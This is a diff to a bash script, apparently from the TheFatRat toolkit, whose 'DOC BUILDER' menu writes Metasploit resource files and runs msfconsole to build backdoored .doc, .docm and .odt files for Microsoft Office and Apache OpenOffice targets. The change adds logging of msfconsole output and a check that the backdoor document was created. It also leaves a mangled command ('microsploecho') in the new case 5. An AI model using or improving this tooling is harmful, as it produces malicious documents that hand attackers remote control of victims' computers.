@@ -72,7 +72,7 @@ temp=$path/temp
 file="config/config.path"
 meterp="$path/temp/meterpreter.rc"
 outf="app_backdoor.apk"
-
+msploit=$path/logs/msploit.log
 
 # spinner for Metasploit Generator
 spinlong ()
@@ -140,9 +140,25 @@ cat << !
 !
 }
 
+#Microsploit log file
+msploitr () 
+{
+rm -rf $msploit >/dev/null 2>&1
+touch $msploit
+echo "**********************************************" > $msploit
+echo "*           Microsploit    Log               *" >> $msploit
+echo "**********************************************" >> $msploit
+echo "             Metepreter Data                  " >> $msploit
+echo "----------------------------------------------" >> $msploit
+cat $meterp | while read LINE
+do
+echo $LINE >> $msploit
+done
+echo "----------------------------------------------" >> $msploit
+echo "              Xterm Output                    " >> $msploit
+echo "----------------------------------------------" >> $msploit
 
-
-
+}
 
 #Checking
 [[ `id -u` -eq 0 ]] || { echo -e $red "Must be root to run script"; exit 1; }
@@ -1020,16 +1036,32 @@ case $choice in
           echo "set FILENAME $fira.doc" >> $meterp
           echo "exploit" >> $meterp
           echo "exit -y" >> $meterp
-         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+          msploitr
+         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+          cat $path/temp/xterm.tmp | while read LINE
+                do
+                echo $LINE >> $msploit
+                done
+                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
+
          	echo ""
-         	mv ~/.msf4/local/$fira.doc $path/output/$fira.doc
+         	mv ~/.msf4/local/$fira.doc $path/output/$fira.doc >/dev/null 2>&1
          	echo -e $okegreen""
-         	echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.doc "
-					sleep 2
-					echo ""
-          read -rsp $'Press any key to return to menu\n' -n 1 key
+                fidoc=$path/output/$fira.doc
+                if [ -f "$fidoc" ]
+                then
+                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.doc "
+                echo -e
+                read -rsp $'Press any key to return to menu\n' -n 1 key
           microsploit
+         	else
+                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
+check $path/logs/msploit.log for more information about the error ."
+                echo -e $green ""
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+fi
  ;;
 
 2)
@@ -1076,16 +1108,32 @@ case $choice in
           echo "set BODY $bodys" >> $meterp
           echo "exploit" >> $meterp
           echo "exit -y" >> $meterp
-          xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+          msploitr
+          xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+                cat $path/temp/xterm.tmp | while read LINE
+                do
+                echo $LINE >> $msploit
+                done
+                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm
+         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
          	echo -e $okegreen""
-         	echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
-					sleep 2
-					echo ""
-          read -rsp $'Press any key to return to menu\n' -n 1 key
+
+         	fidoc=$path/output/$fira.docm
+                if [ -f "$fidoc" ]
+                then
+                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e
+                read -rsp $'Press any key to return to menu\n' -n 1 key
           microsploit
+         	else
+                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
+check $path/logs/msploit.log for more information about the error ."
+                echo -e $green ""
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+fi
 
 						elif [ $exe != 'n' ] && [ $exe != 'N' ]
 							then
@@ -1111,16 +1159,32 @@ case $choice in
           echo "set EXE::Custom $exef" >> $meterp
           echo "exploit" >> $meterp
           echo "exit -y" >> $meterp
-         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+          msploitr
+         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+                cat $path/temp/xterm.tmp | while read LINE
+                do
+                echo $LINE >> $msploit
+                done
+                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm
+         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
 					echo ""
-         	echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
-					sleep 2
-					echo ""
-          read -rsp $'Press any key to return to menu\n' -n 1 key
+         	
+                fidoc=$path/output/$fira.docm
+                if [ -f "$fidoc" ]
+                then
+                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e
+                read -rsp $'Press any key to return to menu\n' -n 1 key
           microsploit
+         	else
+                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
+check $path/logs/msploit.log for more information about the error ."
+                echo -e $green ""
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+fi
 fi
 ;;
 
@@ -1172,16 +1236,32 @@ fi
           echo "set target 1" >> $meterp
           echo "exploit" >> $meterp
           echo "exit -y" >> $meterp
-         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+          msploitr
+         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+                cat $path/temp/xterm.tmp | while read LINE
+                do
+                echo $LINE >> $msploit
+                done
+                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-    			mv ~/.msf4/local/$fira.docm $path/output/$fira.docm
+    			mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
         	echo -e $okegreen""
-         	echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
-					sleep 2
-					echo ""
-          read -rsp $'Press any key to return to menu\n' -n 1 key
+         	
+                fidoc=$path/output/$fira.docm
+                if [ -f "$fidoc" ]
+                then
+                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e
+                read -rsp $'Press any key to return to menu\n' -n 1 key
           microsploit
+         	else
+                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
+check $path/logs/msploit.log for more information about the error ."
+                echo -e $green ""
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+fi
 						elif [ $exe != 'n' ] && [ $exe != 'N' ]
 							then
 					#payload y
@@ -1208,20 +1288,35 @@ fi
           echo "set target 1" >> $meterp
           echo "exploit" >> $meterp
           echo "exit -y" >> $meterp
-         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+          msploitr
+         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+                cat $path/temp/xterm.tmp | while read LINE
+                do
+                echo $LINE >> $msploit
+                done
+                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm
+         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
          	echo -e $okegreen""
-         	echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
-					sleep 2
-					echo ""
-          read -rsp $'Press any key to return to menu\n' -n 1 key
+         	fidoc=$path/output/$fira.docm
+                if [ -f "$fidoc" ]
+                then
+                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e
+                read -rsp $'Press any key to return to menu\n' -n 1 key
           microsploit
+         	else
+                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
+check $path/logs/msploit.log for more information about the error ."
+                echo -e $green ""
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+fi
 ;;
 
 4)
-          cho -e $red"   Apache OpenOffice on Windows (PSH) "
+          echo -e $red"   Apache OpenOffice on Windows (PSH) "
 					echo -e $okegreen""
 					echo -ne "   SET LHOST : ";tput sgr0
 					read yourip
@@ -1259,16 +1354,35 @@ fi
           echo "set BODY $bodys" >> $meterp
           echo "exploit -z" >> $meterp
           echo "exit -y" >> $meterp
-          xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+          msploitr
+          xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+                cat $path/temp/xterm.tmp | while read LINE
+                do
+                echo $LINE >> $msploit
+                done
+                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.odt $path/output/$fira.odt
+         	mv ~/.msf4/local/$fira.odt $path/output/$fira.odt >>$msploit 2>&1
          	echo -e $okegreen""
-         	echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
-					sleep 2
-					echo ""
-          read -rsp $'Press any key to return to menu\n' -n 1 key
-          microsploecho -e $red"   Apache OpenOffice on Linux (PSH) "
+         	fidoc=$path/output/$fira.odt
+                if [ -f "$fidoc" ]
+                then
+                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
+                echo -e
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+         	else
+                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
+check $path/logs/msploit.log for more information about the error ."
+                echo -e $green ""
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+fi
+;;
+
+      5)
+                   microsploecho -e $red"   Apache OpenOffice on Linux (PSH) "
 					echo -e $okegreen""
 					echo -ne "   SET LHOST : ";tput sgr0
 					read yourip
@@ -1306,16 +1420,31 @@ fi
           echo "set BODY $bodys" >> $meterp
           echo "exploit" >> $meterp
           echo "exit -y" >> $meterp
-         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+          msploitr
+         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+                cat $path/temp/xterm.tmp | while read LINE
+                do
+                echo $LINE >> $msploit
+                done
+                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.odt $path/output/$fira.odt
+         	mv ~/.msf4/local/$fira.odt $path/output/$fira.odt >>$msploit 2>&1
          	echo -e $okegreen""
-         	echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
-					sleep 2
-					echo ""
-          read -rsp $'Press any key to return to menu\n' -n 1 key
+         	fidoc=$path/output/$fira.odt
+                if [ -f "$fidoc" ]
+                then
+                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
+                echo -e
+                read -rsp $'Press any key to return to menu\n' -n 1 key
           microsploit
+         	else
+                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
+check $path/logs/msploit.log for more information about the error ."
+                echo -e $green ""
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+fi
 ;;
         6)
         clear
